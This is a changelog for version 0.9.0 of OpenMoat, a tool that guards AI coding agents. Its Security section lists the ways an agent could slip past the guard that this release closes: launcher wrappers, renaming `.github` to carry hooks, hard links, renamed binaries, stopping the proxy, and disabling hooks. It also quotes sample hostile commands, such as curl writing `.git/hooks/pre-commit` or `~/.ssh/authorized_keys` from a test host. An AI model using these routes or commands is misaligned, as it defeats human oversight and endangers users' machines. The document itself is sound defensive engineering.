Released 2026-10-22. [GitHub release v0.9.0](https://github.com/crocodile-labs/openmoat/releases/tag/v0.9.0).

<Aside type="caution" title="Upgrading">

- **Run `openmoat init` once, then restart your agents.** An agent keeps the hook it read when it started, and an OpenMoat older than 0.9.0 denies every call over a lock 0.9.0 has written. Keep one OpenMoat installed: if you have a Homebrew install and a `cargo install`, remove one.
- **Run `openmoat policy upgrade`**, then `openmoat sandbox sync`, to get the new rules: agents' own configuration folders (Gemini CLI's policies and commands, Claude Code's agents, skills and commands, a repository's `.github` agents) ask before a write, writing `~/.curlrc` or `~/.wgetrc` is denied (`shell-rc`), stopping the proxy service is denied, and `at` and `batch` ask like `crontab`.
- **Nothing to do for the rest.** As soon as the new binary runs, commands started through launchers (`flock -c`, `taskset`, `nsenter` and others) are checked as the commands they run, and hard links count as writes. A `curl` or `wget` is decided like a web fetch only as `curl -q …` or `wget --no-config --no-netrc …`, so a plain `curl` to an unlisted host is denied again ([Network allowlist](/docs/allow-a-site/)).
- **New agents:** GitHub Copilot CLI, pi and Gemini CLI. `openmoat init` finds the ones you have ([Supported agents](/docs/agents/)).
- **Breaking, things you may notice:** tools of MCP servers wrapped with `openmoat mcp proxy` are held once after the upgrade until you run `openmoat mcp accept`; session grants from earlier releases need approving again; through `openmoat proxy` and `openmoat run`, a host allowed without a port is reached on ports 443 and 80 only (add `host:port` for another); repository policies and policy packs must be signed again in their new namespaces (`openmoat-repo-policy`, `openmoat-pack`), and their keys trusted again with `openmoat policy trust-key` ([Signed policy packs](/docs/team-rules/policy-packs/)); on Linux without bubblewrap, `openmoat run` refuses a `--write` path outside the project, `~/.claude` included. Codex runs OpenMoat's hook only after you trust it in Codex's `/hooks`.

Every step after an upgrade: [Upgrade](/docs/upgrade/).

</Aside>

## Security
- The command line `flock -c`/`--command` runs, and the commands of launchers that start their arguments (`taskset`, `chrt`, `numactl`, `unshare`, `nsenter`, `prlimit`, `setpriv`, `chpst`, `cgexec`, `firejail`, `sandbox-exec`, `arch`, `strace`, `ltrace`, `valgrind`, `catchsegv`, `gdb --args`, `faketime`, `torsocks`, `proxychains`, `systemd-inhibit`, `busybox`, `toybox`), are decided as commands of their own, so a secret read, a hook-settings write or `rm -rf ~` inside one is denied as it is on its own ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- The person-only `openmoat` commands are also denied when `systemd-run`, `daemonize`, `start-stop-daemon`, `launchctl submit` or an `at` or `batch` job starts them; `at` and `batch` ask like `crontab` (`persistence`), and the job they read from stdin is decided as a command line ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Renaming or removing a repository's `.github` or `.github/copilot` folder is denied (`agent-folders`, hook only), and the same for `.github/hooks`, `.pi` and `.pi/extensions` asks (`runs-later`): a rename away and back edited the Copilot settings, hooks or pi files inside under another name. This also denies an agent's `mkdir .github` or `rm -r .github`; writing files inside `.github` is unchanged ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Stopping, disabling, masking or killing the proxy service (`systemctl --user stop moat-proxy`, `launchctl bootout …/dev.openmoat.proxy`, and the like) is denied like `openmoat proxy uninstall` (`kernel-self`), and `pkill` or `killall` naming `moat` asks (`stops-openmoat`) ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `ln` options are read as `ln` reads them: `ln -S -s`, `ln -t -s` and an `-s` after the first operand (`ln SRC DIR -s`, a file to BSD `ln`) make hard links, decided as a write of the linked file ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Copies, moves and links by the GNU tools installed with a `g` in front (`gcp`, `gmv`, `gln`, `grm`, …), by `busybox` and `toybox` applets, macOS `ditto`, `pax -rw` and `cpio` are decided as writes of what they write, as `cp`, `mv` and `ln` are ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- A person-only `openmoat` command run through a link under another name, or a name on the search path, that reaches the binary the policy lock records is denied by `kernel-self` like `openmoat` itself, and so is any spelling of `openmoat` in another case where file names ignore case (`OpenMoat allow` on macOS and Windows) ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- The person-only commands also refuse to run when started under a name other than `openmoat` or `moat`, check the lock in `~/.moat` as well as the one `MOAT_HOME` names, and refuse when a lock exists but cannot be read; a link to `openmoat` under another name no longer runs them ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat mcp accept` shows a server's tool names, titles and descriptions with escape sequences and bidirectional characters replaced by `?`, so a tool cannot redraw the changes you are asked to accept ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- The text OpenMoat prints from agents, repositories and servers (the `openmoat trust` and `openmoat allow --last` questions included) shows invisible bidirectional and zero-width characters (U+202E, U+2066, U+200B, U+FEFF, …) as `?`, so a rule cannot be shown in another order than it is read ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat mcp proxy` holds a tool listed twice under one name when any of its entries differs from the accepted pin, whatever their order; drops a listed tool whose `name` is not a string; and pins every field of a tool besides the named ones (`_meta`, `icons`, `execution`, …), so a tool that has such fields is held once after upgrading ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- A `net` or `fetch` allow written `host:port` (`*:8443`) no longer also matches a host without a port, so it opens no IPv6 address whose text ends in `:8443` in the hook or on ports 443 and 80 in the proxy ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- A `plain_http: true` secret is no longer handed to Claude Code's own broker, which injected it on every port of its host, and OpenMoat no longer sets Claude Code's `allowPlaintextInject`: such a secret goes through `openmoat proxy` only, on its one port. Inside Claude Code's sandbox it works only while `sandbox.proxy_port` routes traffic through `openmoat proxy` ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Repository policy signatures are made and checked in their own namespace, `openmoat-repo-policy`: a pack signed in `openmoat-policy` by an earlier release is no longer a signed repository policy. This breaks every repository policy signature made before: sign the file again with `ssh-keygen -Y sign -n openmoat-repo-policy`, and run `openmoat policy trust-key` again for each key trusted before ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- A change to Claude Code's `autoMode` settings, whose rules decide which calls its auto mode runs unasked, is drift that denies every call until `openmoat doctor --accept`, instead of being decided through ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat run` keeps commands from renaming away the folders that hold an agent's configuration directly in the project (`.github`, `.pi`, `.openclaw`), which carried a hook written under the other name back past the protection: on macOS they cannot be created, renamed or removed under `openmoat run` (create a missing `.github` outside it), and on Linux each existing one is bound onto itself, with the network namespace and with `--isolate` ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat run` on Linux, where the agent gets a network namespace, also makes the agents' hook settings that exist directly in the project read-only for the session (`.claude/settings.json`, `.claude/settings.local.json`, `.cursor/hooks.json`, `.codex/hooks.json`, `.gemini/settings.json`, `.github/copilot/settings.json`, `.copilot/hooks/`), as on macOS; an agent inside can no longer save its own changes to them there ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat run` on macOS denies a file or folder created in another case than a deny rule names (`.MCP.json`, `.Claude`), which on a case-insensitive disk is the file the agent loads ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat run` on Linux without a network namespace also refuses a `--write` path inside a tree `kernel-self` protects whole (`~/.codex/sessions`) and every `--write` path outside the project, which can hold another repository's hook settings. This breaks `--write` outside the project there, `~/.claude/projects` included: install bubblewrap and allow unprivileged user namespaces ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat run` on Linux refuses `setns` (joining an existing namespace), as it refuses creating one; `nsenter` and a container runtime's `exec` fail inside ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- A tool OpenMoat does not map is checked for what its arguments name, for every host that hands it to OpenMoat (pi, OpenClaw, Gemini CLI, Cursor, GitHub Copilot CLI): every path and URL, by key or by its look at any depth, and every shell command under a key such as `command`, `cmd` or `script`. A pi extension's tool reading `~/.ssh/id_rsa` ran unchecked before, since pi runs a call OpenMoat makes no decision on; now it is denied. A tool whose arguments name a host to contact is denied by the `net` default unless the host is allowed, and arguments nested deeper than 8 levels deny the call ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Gemini CLI's `run_shell_command` `dir_path` and OpenClaw's `exec` `workdir` no longer decide which directory is the project: the command is checked after a `cd` there, and the project stays the session's. A command writing a launch agent with `dir_path` in `~/Library/LaunchAgents` was allowed as a write in its own project ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- GitHub Copilot CLI's `write_bash` and `write_powershell` ask (new rule `unchecked`): the shell joins typed input to what came before, so a command split over two calls passed piece by piece. A `bash` command that leaves Copilot's shell, which later calls reuse, in a directory OpenMoat cannot know (`cd "$X"`, `popd`, `eval`) asks too ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Gemini CLI's `grep_search` and `glob` without `dir_path`, and every `read_many_files`, ask (`unchecked`): Gemini CLI then searches every workspace directory, and the hook names only the working directory. `grep_search`'s `include_pattern` (and the older `include`) is checked for where it climbs to. This adds a Gemini CLI confirmation for such searches ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- A glob pattern whose brace or bracket group holds a separator, a `..` or another brace group (`{x/../..,y}`) asks (`unchecked`) in Claude Code's `Glob`, Gemini CLI's `glob` and `read_many_files`, pi's `find` and Copilot CLI's `glob`: it may climb further than OpenMoat works out ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Writes to Gemini CLI's policy files (`.gemini/policies/`, `~/.gemini/policies/`), custom commands (`.gemini/commands/`) and subagents (`.gemini/agents/`), a repository's Copilot CLI agents (`.github/agents/`) and Claude Code's subagents, skills and slash commands (`.claude/agents/`, `.claude/skills/`, `.claude/commands/`) ask (`runs-later`), in a project too, and after untrusted content session taint protects `.github/agents/`. Writing a project's Claude Code skill or command, allowed before, now asks ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- The person-only `openmoat` commands are also denied under `setsid` and `flock`, and `openmoat proxy install` and `openmoat proxy uninstall` are person-only like `uninstall`: a service installed or removed changes every later session ([#626](https://github.com/crocodile-labs/openmoat/pull/626)).
- The person-only commands (all but `openmoat init`) refuse to run from an executable other than the `openmoat` the policy lock records or its `moat` alias: a copy of the binary under another name, started where the agent is no longer among its parent processes, got past the guard's check by name. Run them from the installed `openmoat`, or run `openmoat init` from the new binary to point the hooks at it ([#626](https://github.com/crocodile-labs/openmoat/pull/626)).
- A search tool's glob pattern whose `..` segments climb out of the directory it searches, also after a wildcard (`*/../..`, `{..,x}`), is checked against the directory it reaches: Claude Code's `Glob`, Gemini CLI's `glob` and `read_many_files`, pi's `find` and Copilot CLI's `glob`; a deny on reading that directory holds ([#625](https://github.com/crocodile-labs/openmoat/pull/625)).
- Claude Code's `Artifact` and `ArtifactData` tools are checked: every local file they upload to a claude.ai page is a read, like `SendFile`'s, and each file `Artifact` saves with `out_dir` is a write; `openmoat init` adds them to the hook's matcher ([#625](https://github.com/crocodile-labs/openmoat/pull/625)).
- `openmoat proxy` and `openmoat run`'s proxy count ports: a host allowed by a pattern without a port is reached on 443 and 80 only, and any other port is refused (`proxy-port`) unless a `net` or `fetch` rule names it as `host:port` (`example.com:8443`). This breaks connections to other ports that worked before, `defaults: { net: allow }` included: add a `host:port` rule for each ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- `openmoat run`'s proxy also refuses the hosts the project's repository policy denies; the repository's allow and ask rules are still not used there ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- A brokered secret with `plain_http: true` is injected into plain-HTTP requests to port 80 only, or to the port its new `port` field names; a request to another port of the host keeps the placeholder. A secret on another port stops being injected until its entry sets `port` ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- In `openmoat run`, a connection opened before the session read secret material is closed within about a second once the session's taint refuses its host ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- The proxy resolves names as fully qualified (`name.`), so the resolver tries no search domain first; on Windows names are resolved as before. A single-label name that resolved only through a search domain no longer resolves ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- On Linux, `openmoat run`'s seccomp filter refuses `sendto`, `sendmsg` and `sendmmsg` with `MSG_FASTOPEN` (`EPERM`): TCP Fast Open connects without the `connect()` Landlock's port rule checks. A program that asks for TCP Fast Open gets an error ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- A private address an allow list excludes (`!10.0.0.9`) is no longer opened by the list's other address patterns when a name resolves to it ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- `openmoat run` on macOS denies its commands writing an agent's own configuration in the project (`.claude/hooks/`, `.mcp.json`, `.cursor/mcp.json`, `.codex/config.toml`, `.github/hooks/`, `.github/mcp.json`, `.openclaw/extensions/`, `.pi/extensions/`, `.pi/mcp.json`, `.pi/settings.json`), which the agent loads later outside the sandbox, also inside a `--write` path; on Linux, where the agent gets a network namespace, the ones that exist directly in the project are read-only for the session. This also refuses such a write that the hook asked about and you allowed: change these files outside `openmoat run`. CI files and commit-hook managers' files stay writable ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `openmoat run` lets commands open only `/dev/tty` and the terminal it was started on, no longer every terminal of yours (`/dev/ttys*` on macOS, `/dev/pts/*` on Linux), so a script cannot read or write your other terminals. A program that opens a new pseudo-terminal inside (`script`, `expect`, `node-pty`) can now fail there ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `openmoat run` on Linux refuses the kernel keyrings (`keyctl`, `add_key`, `request_key`) and new namespaces (`unshare`, `clone` with a namespace flag; `clone3` answers `ENOSYS`, so the C library falls back to `clone`). Containers, bubblewrap and Chromium's own sandbox no longer start inside ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `openmoat run` on Linux without a network namespace refuses to start when a `--write` path holds what `kernel-self` protects (OpenMoat's state, an agent's hook settings), naming the paths; it only warned before. This breaks `openmoat run --write ~/.claude` on Linux without bubblewrap: install bubblewrap and allow unprivileged user namespaces, or grant narrower paths ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `rename`, `prename`, `perl-rename` and `file-rename` write every path they name, so renaming an agent's directory with them is denied (`kernel-self`) like `mv .claude x` and `mv x .claude`. Claude Code's generated settings add the `Edit(./.cursor/hooks.json)`-style rules on every OS, so on macOS its sandbox keeps the working directory's `.cursor`, `.codex`, `.copilot` and `.gemini` from being moved away and replaced by a command ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- Claude Code's generated settings on Linux hide OpenMoat's state directory whole from sandboxed commands: its sandbox skips a read deny that is missing when a command starts, so the audit log's `-wal` and `-shm` files made while the command ran stayed readable. A `MOAT_HOME` outside the home is now hidden there, its policy included ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `openmoat mcp proxy` also pins each tool's title, output schema and annotations (`readOnlyHint`, `destructiveHint`), so a change to any of them holds the tool. After upgrading, every tool it pinned before is held once, even unchanged; `openmoat status` and `openmoat doctor` say so, and one `openmoat mcp accept` pins them again ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- A session grant for a command from `openmoat allow` applies only in the project it was approved in (the repository root, else the working directory); `openmoat allow "<command>" --session …` binds it to the current directory's project or `--project <dir>`. Command grants made by an earlier release stop applying, and `openmoat status` and `openmoat allowed` list them for approving again ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `openmoat trust` shows the repository policy's path, digest and rules first and asks `Trust this file? [y/N]`; without a yes it trusts nothing ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- A change of Claude Code's `permissions.defaultMode` to a mode that runs calls without asking (`acceptEdits`, `auto`, `bypassPermissions`, or any value other than `default`, `plan` and `dontAsk`) and any change to `permissions.additionalDirectories` are drift that denies every call until `openmoat doctor --accept`, instead of being decided through ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- Making a hard link is decided as a write of the file it links to (`ln` without `-s`, `link`, `cp -l`/`--link`, `rsync --link-dest`), so a hard link to OpenMoat's state or an agent's hook settings is denied by `kernel-self` ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- Policy packs are signed in their own namespace, `openmoat-pack`, so a signed pack is never accepted as a signed repository policy, or the reverse. This breaks installing a pack signed in `openmoat-policy`: sign it again with `ssh-keygen -Y sign -n openmoat-pack`, and run `openmoat policy trust-key` again for a key trusted before; installed packs and repository policy signatures keep working ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `openmoat proxy` refuses a connection that reaches this machine through one of its other addresses (its LAN or public IPv4 or IPv6 address, where services listening on every interface answer as on loopback); it is closed before a byte is sent (`proxy-address`) ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat proxy` checks an IPv4-translated address (`::ffff:0:a.b.c.d`) as the IPv4 address it reaches, as it does NAT64 and IPv4-compatible ones, so `::ffff:0:a9fe:a9fe` is refused as link-local ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat proxy` refuses a plain-HTTP `Content-Length` over 2^31 - 1 (chunk sizes already were), a `Transfer_Encoding` or `Content_Length` header (servers that pass headers on as CGI-style variables read it as the framing header), and a port with a sign (`:+80`) in the target or `Host` ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat proxy` no longer puts a brokered secret into a plain-HTTP `TRACE` or `TRACK`, whose answer would echo it to the agent ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- A plain-HTTP request whose chunked body turns malformed after the head is now recorded when the proxy cuts it, not only by its earlier `allow` row ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- The push check of `openmoat guard` runs the `git` the search-path snapshot `openmoat init` recorded, by its absolute path, instead of the first `git` on the hook's own `PATH`: a relative entry there (`.`, `node_modules/.bin`) named a directory of the repository being pushed, and a `git` placed in it ran outside every sandbox. Without such a `git` the push asks (`push-unchecked`). The `ssh-keygen` that checks a signed repository policy and policy packs, and the `git` of `openmoat audit anchor`, are likewise never taken from a relative entry of the recorded search path, where one planted in the project could pass any signature ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- Audit redaction masks the whole quoted value of a named credential, spaces included (`DB_PASSWORD="a b c"`, `--password 'a b c'`, `-u "user:pass word"`); only its first word was masked before ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat mcp proxy` filters every response that lists tools, whatever its id: a server that answered a `tools/list` under another spelling of the request's id (`"2"` for `2`) had its changed or new tools shown to the agent ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat mcp proxy` no longer passes on a message from the agent host that it cannot read as JSON (a lone surrogate, an out-of-range number), which the server's own parser might read as a tool call; it answers with a parse error ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat init` over an existing policy lock without a person at a terminal (an `openmoat init --yes` detached from the agent) no longer changes what the lock trusts: it refuses to point the hooks at a binary other than the one the lock records, and keeps each agent's recorded configuration directory (`hosts.json`, which decides the MCP files the guard reads) and the search-path snapshot (`environment.json`) instead of taking them from its own environment ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- A state file missing when the lock is re-pinned (`trust.json` before the first `openmoat trust`, or `approvals.json`, `policy.d/approved.yaml`, `hosts.json` or `environment.json` after a person accepted their deletion) is pinned as missing: one that appears there later is drift and denies every call (`kernel-integrity`), where the guard read it from disk unpinned, so a planted `approvals.json` or `approved.yaml` could allow calls ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat run` on Linux, where it gives the agent a network namespace, also covers each existing file or directory a deny rule names inside a read root or a `--write` path, as `--isolate` does (hidden, or read-only for a write deny): with `--write ~/.claude` a command could rewrite `~/.claude/settings.json` and turn OpenMoat's hooks off for later sessions, and a read root's `~/.cargo/credentials.toml` was readable. Without a namespace, `openmoat run` names these paths on every start ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- A `curl` or `wget` decided as a fetch (ADR-035) has every file it writes checked: a clustered or attached output (`curl -sSo .git/hooks/pre-commit`, `-oFILE`, `wget -qO FILE`) was not seen as a write, `--output-dir` and `wget -P` were not joined to the name, and `curl -O` and a plain `wget` wrote the URL's file name unchecked. These are `fs.write`s now for every `curl` and `wget`, so `curl -q -sSo .git/hooks/pre-commit https://x.test/h` asks and `curl -q --output-dir ~/.ssh -o authorized_keys https://x.test/k` is denied ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- `curl -w`/`--write-out` (whose `%output{FILE}` writes to a file since curl 8.3), `-J`/`--remote-header-name` and `wget --content-disposition` (the server names the file), and `-O` of a URL with no plain file name keep a `curl` or `wget` `net`, no longer a fetch ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- A `curl` or `wget` is a fetch only when it reads no configuration file of its own, which could add a body or an upload to the call: `curl` with `-q` (or `--disable`) as its first argument, `wget` with `--no-config --no-netrc`. A plain `curl https://docs.rs/serde` is `net` again and denied for an unlisted host; `curl -q https://docs.rs/serde` defers. `shell-rc` also denies writing `~/.curlrc`, `~/_curlrc`, `~/.config/curlrc`, `~/.wgetrc` and `~/.config/wget/`; existing policies get it with `openmoat policy upgrade` ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- `openmoat init` over an existing policy lock, without a person at a terminal (an `openmoat init --yes` a build script detached from the agent, which the parent-process check cannot see), no longer pins new or changed MCP server definitions: it lists them and leaves them for `openmoat mcp accept`, so a server a cloned project planted in `.mcp.json` stays denied (`mcp-server-changed`). An unreadable lock is now refused without a terminal like a drifted one, pointing at `openmoat doctor --accept`; a first install and a person's `init` are unchanged ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- The person-only commands also refuse when the Continue CLI (`cn`), GitHub Copilot CLI (`copilot`), Gemini CLI (`gemini`) or, on macOS, a Cursor editor helper process (`Cursor Helper`, `Cursor Helper (Plugin)`, …) is among their parent processes. Cursor's editor agent runs commands in the same process tree as the editor's own terminals, so on macOS those commands now refuse in a Cursor terminal too: run them in a terminal of your own ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- `openmoat run --isolate` on Linux drops bubblewrap's `--disable-userns` only when bubblewrap does not know the option (before 0.8); any other failure with it refuses instead of starting the agent able to create user namespaces of its own ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- A Claude Code `ConfigChange` for a project's `.claude/settings.json` or `settings.local.json` is also blocked (`project-settings`) when it sets `enableAllProjectMcpServers`, `enabledMcpjsonServers` (Claude Code starts those servers, which runs their commands) or `extraKnownMarketplaces`, or when the file's bytes change between the check and the decision; `openmoat doctor` and `openmoat status` warn about the new keys too ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- Inline interpreter code that reads the environment through `getattr(os, 'environ')`, `vars(os)`, `os.__dict__`, `env` or `printenv` run as a child (`os.popen('env')`, `subprocess.run(['printenv', 'X'])`), PowerShell's `[Environment]::GetEnvironmentVariable('X')` and `GetEnvironmentVariables()`, its `Env:` drive (`Get-ChildItem Env:`, `gci`, `ls`, `dir env:`) or `$Env:X` in any case is now an `env.read` of the variable it names (`env-secrets`) or the whole environment (`env-dump`) ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- A write of a repository's `.github/mcp.json`, whose servers GitHub Copilot CLI starts in a trusted folder, asks (`runs-later`) and taints like the other agent configuration files ([#623](https://github.com/crocodile-labs/openmoat/pull/623)).

## Added
- `openmoat-hosts` (library API): `HostSpec::BASE` and `InstallSpec::BASE`, the defaults a host spec takes for the fields it does not name, so a new optional field is added once rather than in every host; `Host::EVERY`, every host including those that speak another's format ([#631](https://github.com/crocodile-labs/openmoat/pull/631)).
- Connections the proxy refuses at accept for capacity (`503`) are recorded as `proxy-capacity` rows: the first at once, then one row per 10 seconds with the count ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- `openmoat policy lint` warns about a `net` or `fetch` pattern whose port is not one (`example.com:*`, `example.com:0`, `[::1]:8443`), which matches nothing ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- `openmoat run --netns=require` refuses to start on Linux where the agent cannot get a network namespace of its own, instead of restricting its network by port only; the default, `--netns=auto`, is unchanged ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- `openmoat sandbox show` lists the `hook_only` deny groups (ADR-034), such as `build-credentials`, with their paths, as decided by the hook only and not in the OS sandbox (`hook_only` in `--format json`) ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- GitHub Copilot CLI is a supported agent (`openmoat init --hosts copilot-cli`): OpenMoat's `preToolUse` hook goes into a file of its own, `~/.copilot/hooks/openmoat.json` (or `$COPILOT_HOME/hooks/`), pinned by the lock, and checks shell commands, typed shell input, file reads and writes, patches, searches, fetches and MCP calls; an `ask` is Copilot's own prompt. Copilot runs a call whose hook times out, so `openmoat init` sets `timeoutSec` to 600, far above the guard's own 30 s deadline. `kernel-self` denies the agent writes to `~/.copilot` itself, its hooks directory, `settings.json` and `config.json`, and a repository's `.github/copilot/settings*.json`, whose `disableAllHooks` would turn every hook off; writing a repository's `.github/hooks/*.json`, `~/.copilot/mcp-config.json`, plugins or custom agents asks (`runs-later`), and `openmoat doctor` and `openmoat status` warn about a repository that turns hooks off or carries hook files. No OS sandbox is configured for Copilot CLI; existing policies get the rules with `openmoat policy upgrade` ([#615](https://github.com/crocodile-labs/openmoat/pull/615)).
- pi (`@earendil-works/pi-coding-agent`) is a supported agent, hook only: `openmoat init --hosts pi` writes OpenMoat's extension to `~/.pi/agent/extensions/openmoat.js` (or under `PI_CODING_AGENT_DIR`) and pins it; its `tool_call` handler runs `openmoat guard --host pi` for every tool call, calls a `codemode` script makes included, blocks on a deny and on any failure or a guard that does not answer in 45 s, and asks in pi's own dialog (a deny in print and JSON mode). `kernel-self` denies the agent writes to the extension, pi's agent directory, `settings.json` and `trust.json`, and `runs-later` asks for other pi extensions, pi's `mcp.json` and a project's `.pi/extensions/`, `.pi/mcp.json` and `.pi/settings.json`; existing policies get these with `openmoat policy upgrade` ([#616](https://github.com/crocodile-labs/openmoat/pull/616)).
- Gemini CLI is a supported agent: `openmoat init` adds a `BeforeTool` hook to `~/.gemini/settings.json` (or `$GEMINI_CLI_HOME/.gemini`) that checks its shell, file, search, web and MCP tools, sends an `ask` as Gemini CLI's own confirmation, and is pinned by the lock; `kernel-self` denies the agent writing Gemini CLI's user and project `settings.json`, its `trustedFolders.json` and directory, and writing an extension asks (`runs-later`). When Gemini CLI saves a new model, theme, sign-in method or display setting in that file, `openmoat doctor` reports it and calls are still decided (the keys are listed in its `HostSpec`); any other change to it, a hook, `hooksConfig`, an MCP server or a `tools` setting among them, still denies every call until `openmoat doctor --accept`. Gemini CLI has no fail-closed setting, so a hook that times out lets the call run, and there is no OS sandbox from OpenMoat for it ([#617](https://github.com/crocodile-labs/openmoat/pull/617)).
- The MCP servers of GitHub Copilot CLI (`~/.copilot/mcp-config.json`, and a project's `.mcp.json` and `.github/mcp.json`, wrapped in `mcpServers` or bare) and of pi (`~/.pi/agent/mcp.json`, a project's `.pi/mcp.json`) are pinned like the other agents': a changed or new one holds back its own tool calls (`<server>-…` for Copilot, `mcp__<server>__…` as pi spells it) until `openmoat mcp accept`; `openmoat mcp wrap` handles Copilot's `local` servers ([#623](https://github.com/crocodile-labs/openmoat/pull/623)).
- `openmoat status` and `openmoat doctor` report an agent as not protected when its own settings turn OpenMoat's hook off: `disableAllHooks` in Claude Code's or Copilot's `settings.json`, `[features] hooks = false` in Codex's `config.toml`, `hooksConfig` in Gemini CLI's `settings.json`, an `extensions` entry in pi's `settings.json` that excludes OpenMoat's extension ([#623](https://github.com/crocodile-labs/openmoat/pull/623)).
- `openmoat status` and `openmoat doctor` warn about a project's Gemini CLI `.gemini/settings.json`, pi `.pi/settings.json` and `.pi/extensions/`, Codex `.codex/config.toml` and `.codex/hooks.json`, and Cursor `.cursor/hooks.json` that turn hooks off, add hooks or extensions, or start programs ([#623](https://github.com/crocodile-labs/openmoat/pull/623)).
- `--help` of `openmoat init`, `uninstall`, `guard`, `bench`, `replay` and the audit commands lists every host id `--hosts`/`--host` takes, and the shell completes them ([#623](https://github.com/crocodile-labs/openmoat/pull/623)).

## Fixed
- A `moat` started through a symbolic link in another directory (`~/bin/moat → …/bin/moat`) finds the `openmoat` beside the file it links to; on macOS it looked only beside the link. The link's own directory is still tried after it ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- Audit redaction keeps values that hold no credential and catches more that do: a name ending in `count`, `file`, `path`, `dir`, `name`, `id`, `len`, `length`, `size`, `type` or `url` (`token_count=`, `--token-file=`, `private_key_path=`) keeps its value; `-u` with a drive path or `uid:gid` outside an HTTP client (`python -u C:\x`, `docker run -u 1000:1000`) is kept; prose after `Bearer` or `Basic` (`bearer authentication`) is kept; and a quoted key with a quoted value (`{"token":"x"}`, `'password': '…'`) is now masked ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- `openmoat policy upgrade` takes, in the same run, a default addition it held back next to a line you changed, so the next `openmoat policy upgrade --dry-run` offers only the lines you changed instead of one more change ([#616](https://github.com/crocodile-labs/openmoat/pull/616)).
- `openmoat guard` and `openmoat policy check` also read each other pinned state file once per call: the `openmoat allow` overlay (`policy.d/approved.yaml`), installed policy packs (`packs.json`, `policy.d/packs/`), `hosts.json`, `environment.json`, `approvals.json` and `trust.json` are parsed from the bytes whose digest matched the lock, and drift in a Claude Code `settings.json` is sorted by the bytes found to differ, so a file rewritten after the check is never the one used. Files the lock does not pin are read as before ([#614](https://github.com/crocodile-labs/openmoat/pull/614)).
- Docs: the host tool mapping in ARCHITECTURE lists GitHub Copilot CLI, pi and Gemini CLI; MOATBENCH lists every host it sends payloads as and their reply formats; POLICY lists every agent's pinned MCP files; USAGE lists every host without an OS sandbox and every key of `openmoat status --format json`; INSTALL, README and THREAT_MODEL say that Codex runs a new or changed hook only once a person trusts it in `/hooks` ([#623](https://github.com/crocodile-labs/openmoat/pull/623)).
